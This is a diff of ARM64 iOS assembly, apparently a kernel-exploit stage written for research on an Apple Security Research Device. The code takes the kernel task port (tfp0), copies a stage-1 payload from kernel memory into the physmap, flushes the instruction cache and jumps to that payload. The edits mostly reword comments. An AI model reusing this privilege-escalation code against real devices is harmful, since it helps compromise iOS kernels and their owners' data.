@@ -1,12 +1,13 @@
+	; Hand Rolled by David Hoyt | SRD0009 | @h02332 for Apple Security Research Device on Wednesday June 14, 2021
 	.section	__TEXT,__text,regular,pure_instructions
 	.build_version ios, 14, 0	sdk_version 14, 0
-	.globl	_main                          ; -- Begin function start
+	.globl	_main                          ; -- Begin function main entry point
 	.p2align	4
 _main: 
-  ; save sigreturn context:
+  ; save signal return context:
   mov x20, x4
  
-  ; save sigreturn token:
+  ; save signal return token:
   mov x21, x5
  
   ; retrieve tfp0
@@ -18,7 +19,7 @@ _main:
   blr x8
   ldr w19, [sp] ; tfp0!
  
-  ; read stage1 into userspace
+  ; read Stage 1 into userspace
   mov w0, w19
   ldr x1, stage1_kaddr
   ldr w2, stage1_size
@@ -27,7 +28,7 @@ _main:
   ldr x8, mach_vm_read
   blr x8
  
-  ; write stage1 into physmap
+  ; write Stage 1 into physmap
   mov w0, w19
   ldr x1, stage1_physmap_kaddr
   ldp x2, x3, [sp]
@@ -39,7 +40,7 @@ _main:
   ldr x8, sys_icache_invalidate
   blr x8 
   
-  ; jump to stage1
+  ; jump to Stage 1
   mov w0, w19 ; tfp0
   mov x1, x20 ; sigreturn context
   mov x2, x21 ; sigretun token
